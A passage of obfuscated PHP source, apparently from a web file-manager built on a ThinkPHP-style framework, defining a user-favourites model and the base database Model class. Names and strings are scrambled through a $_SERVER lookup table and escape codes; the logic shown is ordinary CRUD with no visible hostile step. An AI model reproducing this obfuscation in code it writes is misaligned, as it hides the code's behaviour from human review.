$™œÏÑ¶Ü[12], $™œÏÑ¶Ü[1996]); return empty($ëÓ×ú¢ä) ? 0 : max($ëÓ×ú¢ä) + 1; } public function update($­€š›Õ°, $È˜®Ÿî) { $›ºØ’“„ =& $_SERVER[°‰†òö¯]; $ßæÄŸçÅ = $this->listData($­€š›Õ°); $¼¢Íò¦Ÿ = $this->findByName($È˜®Ÿî[$›ºØ’“„[32]]); if (!$ßæÄŸçÅ || $¼¢Íò¦Ÿ && $¼¢Íò¦Ÿ[$›ºØ’“„[477]] != $ßæÄŸçÅ[$›ºØ’“„[477]]) { return !1; } return parent::update($­€š›Õ°, $È˜®Ÿî); } public function remove($£ª•ÙÓ˜, $Ôôëü™õ = false) { $ÖãĞ˜¡¤ =& $_SERVER[°‰†òö¯]; $ì„ˆ¤€ú = $this->listData($£ª•ÙÓ˜); if (!$ì„ˆ¤€ú) { return; } if (!$Ôôëü™õ && $ì„ˆ¤€ú[$ÖãĞ˜¡¤[191]] == $ÖãĞ˜¡¤[91]) { return !1; } return parent::remove($£ª•ÙÓ˜); } public function enable($¨¯‚„û, $‡ä¯í‘é) { return $this->update($¨¯‚„û, array($_SERVER[°‰†òö¯][2449] => $‡ä¯í‘é)); } public function run($¹…˜‚î) { return $this->update($¹…˜‚î, array($_SERVER[°‰†òö¯][2461] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\141\166"; protected function cacheFunctionAlias($òîÏñû) { $Õåäé…Œ =& $_SERVER[°‰†òö¯]; return array($Õåäé…Œ[2087] => array(USER_ID, $Õåäé…Œ[2462])); } protected function listData() { $úğ”‡¨õ =& $_SERVER[°‰†òö¯]; $€ú¦Îá  = array($úğ”‡¨õ[1762] => USER_ID, $úğ”‡¨õ[561] => 0); $ÈÓÌÈƒ° = $úğ”‡¨õ[2463]; $¦½æ‰¥È = $this->field($ÈÓÌÈƒ°)->where($€ú¦Îá )->order($úğ”‡¨õ[2464])->select(); return $¦½æ‰¥È ? $¦½æ‰¥È : array(); } protected function resetCache() { } protected function listView() { $ğ˜Ï’üï =& $_SERVER[°‰†òö¯]; $Àš“ÎªŸ = $this->listData(); $ÇÇ™ì÷Ÿ = array_filter_by_field($Àš“ÎªŸ, $ğ˜Ï’üï[33], $ğ˜Ï’üï[492]); $¦ŒÈü˜‚ = array_to_keyvalue($ÇÇ™ì÷Ÿ, $ğ˜Ï’üï[12], $ğ˜Ï’üï[87]); if (!$¦ŒÈü˜‚) { return $Àš“ÎªŸ; } $……•ÎÓ = 2000; $İÎËªş = array($ğ˜Ï’üï[493] => array($ğ˜Ï’üï[494], $¦ŒÈü˜‚)); $Š÷ÅÅ¤ò = Model($ğ˜Ï’üï[891])->listSource($İÎËªş, $……•ÎÓ); $Š÷ÅÅ¤ò = array_merge($Š÷ÅÅ¤ò[$ğ˜Ï’üï[86]], $Š÷ÅÅ¤ò[$ğ˜Ï’üï[85]]); $Š÷ÅÅ¤ò = array_to_keyvalue($Š÷ÅÅ¤ò, $ğ˜Ï’üï[193]); foreach ($Àš“ÎªŸ as $ÆÊ˜ÈŒ® => $êªàóÕ‡) { $Œ¢¥ùäœ = $Š÷ÅÅ¤ò[$êªàóÕ‡[$ğ˜Ï’üï[87]]]; $Œ¢¥ùäœ = $Œ¢¥ùäœ ? $Œ¢¥ùäœ : array(); $Àš“ÎªŸ[$ÆÊ˜ÈŒ®] = array_merge($Œ¢¥ùäœ, $êªàóÕ‡); } return $Àš“ÎªŸ; } protected function addFav($Ù”›½Ñ, $¥±­şŠ‡ = '', $¢Ô´Èş× = "\163\157\x75\162\x63\x65") { $Ä°´·™î =& $_SERVER[°‰†òö¯]; $ÏÊÆ­ÌÜ = array($Ä°´·™î[1762] => USER_ID, $Ä°´·™î[561] => 0, $Ä°´·™î[498] => $¢Ô´Èş×, $Ä°´·™î[497] => $Ù”›½Ñ); if ($this->where($ÏÊÆ­ÌÜ)->find()) { return !1; } $ÏÊÆ­ÌÜ = array($Ä°´·™î[1762] => USER_ID, $Ä°´·™î[561] => 0); $ı¢ÊæüÓ = $this->where($ÏÊÆ­ÌÜ)->max($Ä°´·™î[1996]); if (!$ı¢ÊæüÓ) { $ı¢ÊæüÓ = 0; } if (!$¥±­şŠ‡ && $¢Ô´Èş× == $Ä°´·™î[492]) { $‡ûÃÛ§ï = Model($Ä°´·™î[1419])->where(array($Ä°´·™î[493] => $Ù”›½Ñ))->find(); if (!$‡ûÃÛ§ï) { return !1; } $¥±­şŠ‡ = $‡ûÃÛ§ï[$Ä°´·™î[32]]; } $¥±­şŠ‡ = $this->getAutoName($¥±­şŠ‡); $Æ•şÒéÂ = array($Ä°´·™î[1762] => USER_ID, $Ä°´·™î[561] => 0, $Ä°´·™î[496] => $¥±­şŠ‡, $Ä°´·™î[497] => $Ù”›½Ñ, $Ä°´·™î[498] => $¢Ô´Èş×, $Ä°´·™î[1976] => $ı¢ÊæüÓ + 1); return $this->add($Æ•şÒéÂ); } protected function remove($¿ü µÁÀ) { $úšéˆ½‹ =& $_SERVER[°‰†òö¯]; $ëÆÊ“å = array($úšéˆ½‹[1762] => USER_ID, $úšéˆ½‹[495] => $¿ü µÁÀ); return $this->where($ëÆÊ“å)->delete(); } protected function removeByName($¦Ç†œÃ) { $™Ì­Á²‚ =& $_SERVER[°‰†òö¯]; $½µ£¾Ì˜ = array($™Ì­Á²‚[1762] => USER_ID, $™Ì­Á²‚[496] => $¦Ç†œÃ, $™Ì­Á²‚[561] => 0); return $this->where($½µ£¾Ì˜)->delete(); } protected function rename($Õ”÷ùš•, $©¤ßƒœ³) { $ù‡îêÅ’ =& $_SERVER[°‰†òö¯]; if ($Õ”÷ùš• == $©¤ßƒœ³) { return !1; } $‚¡¸×ßæ = $this->getAutoName($©¤ßƒœ³); if ($©¤ßƒœ³ != $‚¡¸×ßæ) { return !1; } $ÜÄ®©ÜÔ = array($ù‡îêÅ’[1762] => USER_ID, $ù‡îêÅ’[561] => 0, $ù‡îêÅ’[32] => $Õ”÷ùš•); return $this->where($ÜÄ®©ÜÔ)->save(array($ù‡îêÅ’[32] => $©¤ßƒœ³)); } protected function resetSort($˜Óœ²¢) { $ğµ¿ô–‹ =& $_SERVER[°‰†òö¯]; $˜Óœ²¢ = is_array($˜Óœ²¢) ? $˜Óœ²¢ : array(); $Î¬İúŠ = array($ğµ¿ô–‹[1762] => USER_ID); for ($„í’À·· = 0; $„í’À·· < count($˜Óœ²¢); $„í’À··++) { $Î¬İúŠ[$ğµ¿ô–‹[495]] = $˜Óœ²¢[$„í’À··]; $this->where($Î¬İúŠ)->save(array($ğµ¿ô–‹[1976] => $„í’À·· + 1)); } return !0; } protected function moveTop($‘çÛ´•ö) { $ú›Ë¬û¥ =& $_SERVER[°‰†òö¯]; $½Ñì‰¶ä = array($ú›Ë¬û¥[1762] => USER_ID, $ú›Ë¬û¥[561] => 0); $·ÕÁëÈŠ = $this->where($½Ñì‰¶ä)->where(array($ú›Ë¬û¥[32] => $‘çÛ´•ö))->find(); if (!$·ÕÁëÈŠ) { return; } $¸å¥å½Ô = $this->field($ú›Ë¬û¥[477])->where($½Ñì‰¶ä)->order($ú›Ë¬û¥[2464])->select(); $¸å¥å½Ô = array_to_keyvalue($¸å¥å½Ô, $ú›Ë¬û¥[12], $ú›Ë¬û¥[477]); $•¢Í“ù  = $¸å¥å½Ô; $¸å¥å½Ô = array_remove_value($¸å¥å½Ô, $·ÕÁëÈŠ[$ú›Ë¬û¥[477]]); array_unshift($¸å¥å½Ô, $·ÕÁëÈŠ[$ú›Ë¬û¥[477]]); return $this->resetSort($¸å¥å½Ô); } protected function moveBottom($Ò½‚Ş“Ü) { $Ş¹Ñ­Ê =& $_SERVER[°‰†òö¯]; $Îºïñç = array($Ş¹Ñ­Ê[1762] => USER_ID, $Ş¹Ñ­Ê[561] => 0); $°©—Ö—Ë = $this->where($Îºïñç)->max($Ş¹Ñ­Ê[1996]); $¤Åí­© = array($Ş¹Ñ­Ê[1996] => $°©—Ö—Ë + 1); return $this->where($Îºïñç)->where(array($Ş¹Ñ­Ê[32] => $Ò½‚Ş“Ü))->save($¤Åí­©); } private function getAutoName($ôĞùÃ¬) { $Øòå Ü¥ =& $_SERVER[°‰†òö¯]; $Ç¦”É¿ = array($Øòå Ü¥[1762] => USER_ID, $Øòå Ü¥[561] => 0); $˜ê€ŒÚ´ = $this->field($Øòå Ü¥[32])->where($Ç¦”É¿)->select(); $˜ê€ŒÚ´ = array_to_keyvalue($˜ê€ŒÚ´, $Øòå Ü¥[12], $Øòå Ü¥[32]); if (!$˜ê€ŒÚ´ || !in_array($ôĞùÃ¬, $˜ê€ŒÚ´)) { return $ôĞùÃ¬; } for ($îûÖš®ƒ = 0; $îûÖš®ƒ < count($˜ê€ŒÚ´); $îûÖš®ƒ++) { if (!in_array($ôĞùÃ¬ . "\x28{$îûÖš®ƒ}\x29", $˜ê€ŒÚ´)) { return $ôĞùÃ¬ . "\50{$îûÖš®ƒ}\51"; } } return $ôĞùÃ¬ . "\50{$îûÖš®ƒ}\x29"; } } $_file = $_SERVER[$_SERVER[°‰†òö¯][944]]; goto FŒÂÒÅÉ½º; c”ƒæ±ùÕ: define($_SERVER[°‰†òö¯][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\157\162\144\145\162", "\141\x6c\151\x61\163", "\150\141\x76\x69\x6e\x67", "\x67\x72\x6f\x75\x70", "\x6c\x6f\x63\x6b", "\144\151\163\x74\x69\x6e\143\164", "\x61\165\x74\157", "\x66\x69\154\164\145\x72", "\166\x61\x6c\x69\x64\141\x74\145", "\x72\145\163\165\x6c\164", "\x62\x69\x6e\144", "\164\x6f\153\145\x6e"); public function __construct($†Æ€äâ§ = '', $›Ğï‘Ú¶ = '', $¸´¼˜èö = '') { $ñ“‰ó±ª =& $_SERVER[°‰†òö¯]; $this->_initialize(); if (!empty($†Æ€äâ§)) { if (strpos($†Æ€äâ§, $ñ“‰ó±ª[10])) { list($this->dbName, $this->name) = explode($ñ“‰ó±ª[10], $†Æ€äâ§); } else { $this->name = $†Æ€äâ§; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($›Ğï‘Ú¶)) { $this->tablePrefix = $ñ“‰ó±ª[12]; } elseif ($ñ“‰ó±ª[12] != $›Ğï‘Ú¶) { $this->tablePrefix = $›Ğï‘Ú¶; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ñ“‰ó±ª[323]); } $this->db(0, empty($this->connection) ? $¸´¼˜èö : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $€×µÚíŞ =& $_SERVER[°‰†òö¯]; if (empty($this->fields)) { if (think_config($€×µÚíŞ[324])) { $®¨¶áªª = $this->dbName ? $this->dbName : think_config($€×µÚíŞ[325]); $Ïî­ç¨í = think_var_cache($€×µÚíŞ[326] . strtolower(get_path_this($®¨¶áªª) . $€×µÚíŞ[10] . $this->name)); if ($Ïî­ç¨í) { $êí·òÃï = think_config($€×µÚíŞ[327]); if (empty($êí·òÃï) || $Ïî­ç¨í[$€×µÚíŞ[328]] == $êí·òÃï) { $this->fields = $Ïî­ç¨í; return; } } } $this->flush(); } } public function flush() { $°âß§Ô¡ =& $_SERVER[°‰†òö¯]; $this->db->setModel($this->name); $æôïâş = $this->db->getFields($this->getTableName()); if (!$æôïâş) { return !1; } $this->fields = array_keys($æôïâş); $this->fields[$°âß§Ô¡[329]] = !1; foreach ($æôïâş as $«ªÒó´¹ => $˜Ïáú†è) { $¹¶Ö“¤[$«ªÒó´¹] = $˜Ïáú†è[$°âß§Ô¡[33]]; if ($˜Ïáú†è[$°âß§Ô¡[39]]) { $this->fields[$°âß§Ô¡[330]] = $«ªÒó´¹; if ($˜Ïáú†è[$°âß§Ô¡[42]]) { $this->fields[$°âß§Ô¡[329]] = !0; } } } $this->fields[$°âß§Ô¡[331]] = $¹¶Ö“¤; if (think_config($°âß§Ô¡[327])) { $this->fields[$°âß§Ô¡[328]] = think_config($°âß§Ô¡[327]); } if (think_config($°âß§Ô¡[324])) { $í¦Ë£ğ” = $this->dbName ? $this->dbName : think_config($°âß§Ô¡[325]); think_var_cache($°âß§Ô¡[326] . strtolower(get_path_this($í¦Ë£ğ”) . $°âß§Ô¡[10] . $this->name), $this->fields); } } public function switchModel($Àâáœ‚ô, $˜›‹æÉÓ = array()) { $šä¿¬µØ =& $_SERVER[°‰†òö¯]; $·°¹Ğªõ = ucwords(strtolower($Àâáœ‚ô)) . $šä¿¬µØ[332]; if (!class_exists($·°¹Ğªõ)) { think_exception($·°¹Ğªõ . think_lang($šä¿¬µØ[333])); } $this->_extModel = new $·°¹Ğªõ($this->name); if (!empty($˜›‹æÉÓ)) { foreach ($˜›‹æÉÓ as $´¤¬ıÅ•) { $this->_extModel->setProperty($´¤¬ıÅ•, $this->{$´¤¬ıÅ•}); } } return $this->_extModel; } public function __set($ñ÷ù¸ü„, $ìºÊÍ™) { $this->data[$ñ÷ù¸ü„] = $ìºÊÍ™; } public function __get($Ë™‰­ˆ×) { return isset($this->data[$Ë™‰­ˆ×]) ? $this->data[$Ë™‰­ˆ×] : null; } public function __isset($ÇÊ¾¥É¨) { return isset($this->data[$ÇÊ¾¥É¨]); } public function __unset($ããüßšÓ) { unset($this->data[$ããüßšÓ]); } public function __call($ñƒÉ›ûá, $Í†È­²ô) { $¯™´å =& $_SERVER[°‰†òö¯]; if (in_array(strtolower($ñƒÉ›ûá), $this->methods, !0)) { $this->options[strtolower($ñƒÉ›ûá)] = $Í†È­²ô[0]; return $this; } elseif (in_array(strtolower($ñƒÉ›ûá), array($¯™´å[334], $¯™´å[335], $¯™´å[336], $¯™´å[337], $¯™´å[338]), !0)) { $ïĞ‰Ş¡˜ = isset($Í†È­²ô[0]) ? $Í†È­²ô[0] : $¯™´å[222]; $ïĞ‰Ş¡˜ = $this->db->parseKey($ïĞ‰Ş¡˜); return $this->getField(strtoupper($ñƒÉ›ûá) . $¯™´å[339] . $ïĞ‰Ş¡˜ . $¯™´å[340] . $ñƒÉ›ûá, $¯™´å[334]); } elseif (strtolower(substr($ñƒÉ›ûá, 0, 5)) == $¯™´å[341]) { $ïĞ‰Ş¡˜ = think_parse_name(substr($ñƒÉ›ûá, 5)); $ÊìÄ¢«Ø[$ïĞ‰Ş¡˜] = $Í†È­²ô[0]; return $this->where($ÊìÄ¢«Ø)->find(); } elseif (strtolower(substr($ñƒÉ›ûá, 0, 10)) == $¯™´å[342]) { $«ôÁ±‰ = think_parse_name(substr($ñƒÉ›ûá, 10)); $ÊìÄ¢«Ø[$«ôÁ±‰] = $Í†È­²ô[0]; return $this->where($ÊìÄ¢«Ø)->getField($Í†È­²ô[1]); } elseif (isset($this->_scope[$ñƒÉ›ûá])) { return $this->scope($ñƒÉ›ûá, $Í†È­²ô[0]); } elseif (method_exists($this, $ñƒÉ›ûá)) { array_unshift($Í†È­²ô, $ñƒÉ›ûá); return call_user_func_array(array($this, $¯™´å[343]), $Í†È­²ô); } else { return call_user_func_array(array(parent, $ñƒÉ›ûá), $Í†È­²ô); } } protected function call() { $–‹š—ô =& $_SERVER[°‰†òö¯]; $‡ƒÕô±« = func_get_args(); $´•—ê§ = array_shift($‡ƒÕô±«); $‹üì¢³â = $´•—ê§; if (is_array($´•—ê§)) { $‹üì¢³â = $´•—ê§[1]; $´•—ê§ = $´•—ê§[0]; } $İŠòƒé¥ = count($‡ƒÕô±«) - 1; if (isset($‡ƒÕô±«[$İŠòƒé¥]) && $‡ƒÕô±«[$İŠòƒé¥] === $´•—ê§) { think_exception(__CLASS__ . $–‹š—ô[4] . $´•—ê§ . think_lang($–‹š—ô[344])); return; } $‡ƒÕô±«[] = $´•—ê§; if (method_exists($this, $–‹š—ô[345])) { $„¡ß‹¸ª = call_user_func_array(array($this, $–‹š—ô[346]), array($‹üì¢³â, $‡ƒÕô±«)); if (!is_null($„¡ß‹¸ª) && $„¡ß‹¸ª !== !1) { return $„¡ß‹¸ª; } } $›©ÉÚÛÇ = call_user_func_array(array($this, $´•—ê§), $‡ƒÕô±«); if (method_exists($this, $–‹š—ô[347])) { $„¡ß‹¸ª = call_user_func_array(array($this, $–‹š—ô[348]), array($‹üì¢³â, $‡ƒÕô±«, $›©ÉÚÛÇ)); if ($„¡ß‹¸ª) { return $„¡ß‹¸ª; } } return $›©ÉÚÛÇ; } protected function _initialize() { } protected function _facade($¹èéûª) { $ã™ôöüı =& $_SERVER[°‰†òö¯]; if (!empty($this->fields)) { foreach ($¹èéûª as $İâÉŒ› => $ËÍıÓÕà) { if (is_array($this->fields) && !in_array($İâÉŒ›, $this->fields, !0)) { unset($¹èéûª[$İâÉŒ›]); } elseif (is_scalar($ËÍıÓÕà)) { $this->_parseType($¹èéûª, $İâÉŒ›); } } } if (!empty($this->options[$ã™ôöüı[349]])) { $¹èéûª = array_map($this->options[$ã™ôöüı[349]], $¹èéûª); unset($this->options[$ã™ôöüı[349]]); } $this->_beforeWrite($¹èéûª); return $¹èéûª; } protected function _beforeWrite(&$Œú–›ó) { } public function add($Í÷Ù¿Ñõ = '', $òÕ¨†™ = array(), $ß¥®¶à = false) { if (empty($Í÷Ù¿Ñõ)) { if (!empty($this->data)) { $Í÷Ù¿Ñõ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[°‰†òö¯][350]); return !1; } } $òÕ¨†™ = $this->_parseOptions($òÕ¨†™); $Í÷Ù¿Ñõ = $this->_facade($Í÷Ù¿Ñõ); if (!1 === $this->_beforeInsert($Í÷Ù¿Ñõ, $òÕ¨†™)) { return !1; } $…ª‚»ö£ = $this->db->insert($Í÷Ù¿Ñõ, $òÕ¨†™, $ß¥®¶à); if (!1 !== $…ª‚»ö£) { $â¾í œõ = $this->getLastInsID(); if ($â¾í œõ) { $Í÷Ù¿Ñõ[$this->getPk()] = $â¾í œõ; $this->_after_insert($Í÷Ù¿Ñõ, $òÕ¨†™); return $â¾í œõ; } $this->_after_insert($Í÷Ù¿Ñõ, $òÕ¨†™); } return $…ª‚»ö£; } protected function _beforeInsert(&$‰Ğâ„ÍŒ, $§¢á¦á) { } protected function _after_insert($Á…™‰ƒ, $¥ûˆ„Ï) { } public function addAll($È¨î®µ, $½²æÛœÌ = array(), $¼×³Ùˆ = false) { $òØ‡‡ =& $_SERVER[°‰†òö¯]; if (empty($È¨î®µ)) { $this->error = think_lang($òØ‡‡[350]); return !1; } $½²æÛœÌ = $this->_parseOptions($½²æÛœÌ); foreach ($È¨î®µ as $¿Üô¬Â³ => $ş×–Ø‚) { $È¨î®µ[$¿Üô¬Â³] = $this->_facade($ş×–Ø‚); } if (method_exists($this->db, $òØ‡‡[351])) { $ˆÀõéµ€ = $this->db->insertAll($È¨î®µ, $½²æÛœÌ, $¼×³Ùˆ); } else { $this->startTrans(); foreach ($È¨î®µ as $¿Üô¬Â³ => $ş×–Ø‚) { $ˆÀõéµ€ = $this->db->insert($ş×–Ø‚, $½²æÛœÌ, $¼×³Ùˆ); } $this->commit(); } if (!1 !== $ˆÀõéµ€) { $¤Á¹²Ö = $this->getLastInsID(); if ($¤Á¹²Ö) { return $¤Á¹²Ö; } } return $ˆÀõéµ€; } public function selectAdd($»õŞëÊæ = '', $»©¾öˆ½ = '', $ôÈ¡Õ‹› = array()) { $ôÙóæÉÊ =& $_SERVER[°‰†òö¯]; $ôÈ¡Õ‹› = $this->_parseOptions($ôÈ¡Õ‹›); if (!1 === ($±ú§Áï = $this->db->selectInsert($»õŞëÊæ ? $»õŞëÊæ : $ôÈ¡Õ‹›[$ôÙóæÉÊ[352]], $»©¾öˆ½ ? $»©¾öˆ½ : $this->getTableName(), $ôÈ¡Õ‹›))) { $this->error = think_lang($ôÙóæÉÊ[353]); return !1; } else { return $±ú§Áï; } } public function save($È¯ ŒÉº = '', $Øáì«Ú = array()) { $†ñşç³Æ =& $_SERVER[°‰†òö¯]; if (empty($È¯ ŒÉº)) { if (!empty($this->data)) { $È¯ ŒÉº = $this->data; $this->data = array(); } else { $this->error = think_lang($†ñşç³Æ[350]); return !1; } } $È¯ ŒÉº = $this->_facade($È¯ ŒÉº); $Øáì«Ú = $this->_parseOptions($Øáì«Ú); $ÍÄ°¯¥­ = $this->getPk(); if (!isset($Øáì«Ú[$†ñşç³Æ[354]])) { if (isset($È¯ ŒÉº[$ÍÄ°¯¥­])) { $ÄÅò Ê[$ÍÄ°¯¥­] = $È¯ ŒÉº[$ÍÄ°¯¥­]; $Øáì«Ú[$†ñşç³Æ[354]] = $ÄÅò Ê; unset($È¯ ŒÉº[$ÍÄ°¯¥­]); } else { $this->error = think_lang($†ñşç³Æ[353]); return !1; } } if (is_array($Øáì«Ú[$†ñşç³Æ[354]]) && isset($Øáì«Ú[$†ñşç³Æ[354]][$ÍÄ°¯¥­])) { $©ö¦Ç’Ğ = $Øáì«Ú[$†ñşç³Æ[354]][$ÍÄ°¯¥­]; } if (!1 === $this->_beforeUpdate($È¯ ŒÉº, $Øáì«Ú)) { return !1; } $—£ÂÇ¤… = $this->db->update($È¯ ŒÉº, $Øáì«Ú); if (!1 !== $—£ÂÇ¤…) { if (isset($©ö¦Ç’Ğ)) { $È¯ ŒÉº[$ÍÄ°¯¥­] = $©ö¦Ç’Ğ; } $this->_afterUpdate($È¯ ŒÉº, $Øáì«Ú); } return $—£ÂÇ¤…; } protected function _beforeUpdate(&$†§£Ö¢ˆ, $«ŠİèíÇ) { } protected function _afterUpdate($½úú’í–, $ã´¨ó” ) { } public function delete($–¸–‡Å— = array()) { $Ê˜ÓÌ–á =& $_SERVER[°‰†òö¯]; if (empty($–¸–‡Å—) && empty($this->options[$Ê˜ÓÌ–á[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ˆÊõ¢ğ = $this->getPk(); if (is_numeric($–¸–‡Å—) || is_string($–¸–‡Å—)) { if (strpos($–¸–‡Å—, $Ê˜ÓÌ–á[50])) { $ ñ§ª•Â[$ˆÊõ¢ğ] = array($Ê˜ÓÌ–á[355], $–¸–‡Å—); } else { $ ñ§ª•Â[$ˆÊõ¢ğ] = $–¸–‡Å—; } $this->options[$Ê˜ÓÌ–á[354]] = $ ñ§ª•Â; } $–¸–‡Å— = $this->_parseOptions(); if (is_array($–¸–‡Å—[$Ê˜ÓÌ–á[354]]) && isset($–¸–‡Å—[$Ê˜ÓÌ–á[354]][$ˆÊõ¢ğ])) { $å‰ìŒ° = $–¸–‡Å—[$Ê˜ÓÌ–á[354]][$ˆÊõ¢ğ]; } $·‹æÅƒÌ = $this->db->delete($–¸–‡Å—); if (!1 !== $·‹æÅƒÌ) { $ÖàìÂÛ‰ = array(); if (isset($å‰ìŒ°)) { $ÖàìÂÛ‰[$ˆÊõ¢ğ] = $å‰ìŒ°; } $this->_after_delete($ÖàìÂÛ‰, $–¸–‡Å—); } return $·‹æÅƒÌ; } protected function _after_delete($ø¾¼™Ÿó, $¤İÌ›ï‚) { } public function select($šçåÉùê = array()) { $°ÏøÀäÔ =& $_SERVER[°‰†òö¯]; if (is_string($šçåÉùê) || is_numeric($šçåÉùê)) { $¹¿¸³öù = $this->getPk(); if (strpos($šçåÉùê, $°ÏøÀäÔ[50])) { $¯‡¼Ä¯ü[$¹¿¸³öù] = array($°ÏøÀäÔ[355], $šçåÉùê); } else { $¯‡¼Ä¯ü[$¹¿¸³öù] = $šçåÉùê; } $this->options[$°ÏøÀäÔ[354]] = $¯‡¼Ä¯ü; } elseif (!1 === $šçåÉùê) { $šçåÉùê = $this->_parseOptions(); return $°ÏøÀäÔ[356] . $this->db->buildSelectSql($šçåÉùê) . $°ÏøÀäÔ[357]; } $šçåÉùê = $this->_parseOptions(); $ï‘ÛãÁ = $this->db->select($šçåÉùê); if (!1 === $ï‘ÛãÁ) { return !1; } if (empty($ï‘ÛãÁ)) { return null; } $this->_afterSelect($ï‘ÛãÁ, $šçåÉùê); return $ï‘ÛãÁ; } protected function _afterSelect(&$ÓÃÎ¡Ñ, $½°‚§’ª) { } public function buildSql($îèïøØÛ = array()) { $šŒòû =& $_SERVER[°‰†òö¯]; $îèïøØÛ = $this->_parseOptions($îèïøØÛ); return $šŒòû[356] . $this->db->buildSelectSql($îèïøØÛ) . $šŒòû[357]; } public function optionsValue($Ø™ «Ùš = null) { if (is_null($Ø™ «Ùš)) { return $this->options; } elseif (is_array($Ø™ «Ùš)) { $this->options = array_merge($this->options, $Ø™ «Ùš); } } protected function _parseOptions($°—ÅùÁõ = array()) { $‹éäß—¬ =& $_SERVER[°‰†òö¯]; if (is_array($°—ÅùÁõ)) { $°—ÅùÁõ = array_merge($this->options, $°—ÅùÁõ); } $this->options = array(); if (!isset($°—ÅùÁõ[$‹éäß—¬[358]])) { $°—ÅùÁõ[$‹éäß—¬[358]] = $this->getTableName(); $­Ñ¯ «Ï = $this->fields; } else { $­Ñ¯ «Ï = $this->getDbFields(); } if (!empty($°—ÅùÁõ[$‹éäß—¬[359]])) { $°—ÅùÁõ[$‹éäß—¬[358]] .= $‹éäß—¬[53] . $°—ÅùÁõ[$‹éäß—¬[359]]; } $°—ÅùÁõ[$‹éäß—¬[360]] = $this->name; if (isset($°—ÅùÁõ[$‹éäß—¬[354]]) && is_array($°—ÅùÁõ[$‹éäß—¬[354]]) && !empty($­Ñ¯ «Ï) && !isset($°—ÅùÁõ[$‹éäß—¬[361]]) && !isset($°—ÅùÁõ[$‹éäß—¬[358]])) { foreach ($°—ÅùÁõ[$‹éäß—¬[354]] as $—À¾óË± => $ØÉ‰ä›Œ) { $—À¾óË± = trim($—À¾óË±); if (in_array($—À¾óË±, $­Ñ¯ «Ï, !0)) { if (is_scalar($ØÉ‰ä›Œ)) { $this->_parseType($°—ÅùÁõ[$‹éäß—¬[354]], $—À¾óË±); } } elseif (!is_numeric($—À¾óË±) && $‹éäß—¬[11] != substr($—À¾óË±, 0, 1) && !1 === strpos($—À¾óË±, $‹éäß—¬[10]) && !1 === strpos($—À¾óË±, $‹éäß—¬[339]) && !1 === strpos($—À¾óË±, $‹éäß—¬[214]) && !1 === strpos($—À¾óË±, $‹éäß—¬[286])) { unset($°—ÅùÁõ[$‹éäß—¬[354]][$—À¾óË±]); } } } $this->_options_filter($°—ÅùÁõ); return $°—ÅùÁõ; } protected function _options_filter(&$ˆ¼ªÁ¬Ú) { } protected function _parseType(&$›©Ù „Í, $¾ÆĞ¥İ) { $›Íæ¼¡… =& $_SERVER[°‰†òö¯]; if (empty($this->options[$›Íæ¼¡…[362]][$›Íæ¼¡…[4] . $¾ÆĞ¥İ])) { $÷¨’Ç¦ = strtolower($this->fields[$›Íæ¼¡…[331]][$¾ÆĞ¥İ]); if (!1 !== strpos($÷¨’Ç¦, $›Íæ¼¡…[363])) { } elseif (!1 === strpos($÷¨’Ç¦, $›Íæ¼¡…[364]) && !1 !== strpos($÷¨’Ç¦, $›Íæ¼¡…[365])) { $›©Ù „Í[$¾ÆĞ¥İ] = intval($›©Ù „Í[$¾ÆĞ¥İ]); } elseif (!1 !== strpos($÷¨’Ç¦, $›Íæ¼¡…[366]) || !1 !== strpos($÷¨’Ç¦, $›Íæ¼¡…[367])) { $›©Ù „Í[$¾ÆĞ¥İ] = floatval($›©Ù „Í[$¾ÆĞ¥İ]); } elseif (!1 !== strpos($÷¨’Ç¦, $›Íæ¼¡…[368])) { $›©Ù „Í[$¾ÆĞ¥İ] = (bool) $›©Ù „Í[$¾ÆĞ¥İ]; } } } public function find($…µ°¶ŒÙ = array()) { $àÚ›ù¬ =& $_SERVER[°‰†òö¯]; if (is_numeric($…µ°¶ŒÙ) || is_string($…µ°¶ŒÙ)) { $’Œ¦È–×[$this->getPk()] = intval($…µ°¶ŒÙ); $this->options[$àÚ›ù¬[354]] = $’Œ¦È–×; } $this->options[$àÚ›ù¬[369]] = 1; $…µ°¶ŒÙ = $this->_parseOptions(); $¬¨ÃÒ¹ö = $this->db->select($…µ°¶ŒÙ); if (!1 === $¬¨ÃÒ¹ö) { return !1; } if (empty($¬¨ÃÒ¹ö)) { return null; } $this->data = $¬¨ÃÒ¹ö[0]; $this->_afterFind($this->data, $…µ°¶ŒÙ); if (!empty($this->options[$àÚ›ù¬[370]])) { return $this->returnResult($this->data, $this->options[$àÚ›ù¬[370]]); } return $this->data; } protected function _afterFind(&$‰ÚÄšî¦, $Âœ²ã‘) { } protected function returnResult($ĞÙæ¨ÚØ, $®©ª¢ = '') { $èêÑôÒü =& $_SERVER[°‰†òö¯]; if ($®©ª¢) { if (is_callable($®©ª¢)) { return call_user_func($®©ª¢, $ĞÙæ¨ÚØ); } switch (strtolower($®©ª¢)) { case $èêÑôÒü[371]: return json_encode($ĞÙæ¨ÚØ); case $èêÑôÒü[372]: return xml_encode($ĞÙæ¨ÚØ); } } return $ĞÙæ¨ÚØ; } public function parseFieldsMap($»Ãñ¥Êé, $µ »üšô = 1) { if (!empty($this->_map)) { foreach ($this->_map as $àÍÃ¾à => $Œ¡Ğœ…) { if ($µ »üšô == 1) { if (isset($»Ãñ¥Êé[$Œ¡Ğœ…])) { $»Ãñ¥Êé[$àÍÃ¾à] = $»Ãñ¥Êé[$Œ¡Ğœ…]; unset($»Ãñ¥Êé[$Œ¡Ğœ…]); } } else { if (isset($»Ãñ¥Êé[$àÍÃ¾à])) { 